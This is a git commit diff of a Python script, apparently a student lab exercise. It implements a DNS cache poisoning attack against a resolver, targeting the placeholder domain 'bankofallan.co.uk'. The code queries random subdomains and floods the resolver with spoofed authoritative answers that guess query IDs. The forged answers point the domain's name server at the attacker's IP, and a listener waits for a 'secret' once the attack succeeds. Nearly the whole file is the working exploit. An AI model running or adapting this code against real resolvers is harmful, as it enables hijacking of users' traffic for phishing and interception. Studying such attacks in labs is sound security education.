0445a057593f04837d5fd44b87fa02ff2cd214b9
federella <consoli.1538420@studenti.uniroma1.it>
2018-04-24 17:58:15 +0200

    Final version of the code, fully working

--- script.py
+++ script.py
@@ -1,14 +1,13 @@
 import socket
 from dnslib import *
-import multiprocessing
+import threading
+import sys
 
-
-BADGUY_IP = "192.168.1.40" #my ip
 UDP_PORT = 53
-DNS_IP="192.168.1.121" #
 SECRET_PORT = 1337
+DONE = False
 
-def get_qid_and_port():
+def get_qid_and_port(badguy_IP, DNS_IP):
 	# GET PORT AND QUERY ID
 	#SEND SOCKET
 	socket_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -17,7 +16,7 @@ def get_qid_and_port():
 	#RECEIVE SOCKET
 	socket_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	socket_receive.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	socket_receive.bind((BADGUY_IP, 53))
+	socket_receive.bind((badguy_IP, 53))
 	#QUERY PACKET
 	query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("badguy.ru"))
 	socket_send.send(query.pack())
@@ -31,70 +30,85 @@ def get_qid_and_port():
 	return (qid, src_port)
 
 
-def get_ns():
+def get_ns(DNS_IP):
 	#GET NAME SERVER
+
 	socket_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	socket_send.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	socket_send.connect((DNS_IP, 53))
-	query_ns = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("ns.bankofallan.co.uk",QTYPE.NS)) #QUERY PACKET
+	query_ns = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("bankofallan.co.uk",QTYPE.NS)) #QUERY PACKET
 	socket_send.send(query_ns.pack())
 
 	data, address = socket_send.recvfrom(2048)
 	data = DNSRecord.parse(data)
-	ns = str(data.get_a().rdata)
+	answer = data.get_a()
+	ns_IP = str(answer.rdata)
+	ns_hostname = str(answer.rname)[:-1]
 	socket_send.close()
 	#print "The name server for ns.bankofallan.co.uk is at %s" % ns
 	#print
-	return ns
+	return (ns_IP, ns_hostname)
 
 
-def listening():
+def listen(badguy_IP):
 	#LISTEN ON PORT 1337 AND WAIT FOR THE SECRET
 	final_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	final_socket.bind((BADGUY_IP, SECRET_PORT))
-	print "Listening on port %s, waiting for secret..." % SECRET_PORT
-	print
+	final_socket.bind((badguy_IP, SECRET_PORT))
+	print "****"
+	print "%s listening on port %s, waiting for secret..." % (badguy_IP, SECRET_PORT)
 	while True:
 		data, address = final_socket.recvfrom(2048)
-		print "  Secret received:", data
+		print "---> SECRET RECEIVED:", data
+		global DONE
+		DONE = True
 		break
+	final_socket.close()
+	print "****"
 
 
-
-def poisoning():
+def poison(badguy_IP, DNS_IP):
 	#CACHE POISONING
-	qid, port = get_qid_and_port()
-	ns = get_ns()
+	qid, port = get_qid_and_port(badguy_IP,DNS_IP)
+	ns_IP, ns_hostname = get_ns(DNS_IP)
 	sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	sock_send.connect((DNS_IP, 53))
-	domain = "random.bankofallan.co.uk"
+
+	sock_spoof = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	sock_spoof.bind((ns_IP, 53))
+	sock_spoof.connect((DNS_IP, port))
 	while True:
 		#SOCKET WITH SPOOFED IP ADDRESS
-		sock_spoof = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		sock_spoof.bind((ns, 53))
-		sock_spoof.connect((DNS_IP, port))
-		#DNS LOOKUP REQUEST FOR DOMAIN
-		query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion(domain))
+		#DNS LOOKUP REQUEST FOR SUBDOMAIN
+		if DONE: return()
+		query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("random.bankofallan.co.uk"))
 		sock_send.send(query.pack())
 		#GENERATE FORGED RESPONSES AND TRY SEVERAL QUERY ID
 		for i in range(0,50):
 			q_id = qid + i
-			query = DNSRecord(DNSHeader(qr=1,ra=1,id=q_id,aa=1), q=DNSQuestion(domain))
+			query = DNSRecord(DNSHeader(qr=1,ra=1,id=q_id,aa=1), q=DNSQuestion("random.bankofallan.co.uk"))
 			answer = query.reply()
-			answer.add_answer(RR(domain,QTYPE.A,rdata=A(BADGUY_IP),ttl=4800))
-			answer.add_auth(RR(domain,QTYPE.NS,rdata=NS("ns.mydomain.ru"),ttl=4800))
-			answer.add_ar(RR("ns.mydomain.ru",QTYPE.A,rdata=A(BADGUY_IP),ttl=4800))
+			answer.add_answer(RR("random.bankofallan.co.uk",QTYPE.A,rdata=A(badguy_IP),ttl=4800))
+			answer.add_auth(RR("bankofallan.co.uk",QTYPE.NS,rdata=NS(ns_hostname),ttl=4800))
+			answer.add_ar(RR(ns_hostname,QTYPE.A,rdata=A(badguy_IP),ttl=4800))
 			sock_spoof.send(answer.pack())
 		#GET NEW QUERY ID AND TRY AGAIN
-		qid, port = get_qid_and_port()
+		qid, port = get_qid_and_port(badguy_IP, DNS_IP)
+
+
+
 
 if __name__=="__main__":
-	p1 = multiprocessing.Process(target=poisoning)
-	p1.start()
 
+	arglist = sys.argv
 
-	p2 = multiprocessing.Process(target=listening)
-	p2.start()
+	if len(arglist) < 3 or len(arglist) > 3:
+		print "Incorrect number of arguments."
+		print "Usage: python script.py <badguy_IP> <dns_IP>"
+	else:
+		BADGUY_IP = str(sys.argv[1])
+		DNS_IP = str(sys.argv[2])
+		p2 = threading.Thread(target=listen, args=(BADGUY_IP,))
+		p2.start()
 
-	p1.join()
-	p2.join()
+		p1 = threading.Thread(target=poison, args=(BADGUY_IP, DNS_IP,))
+		p1.start()
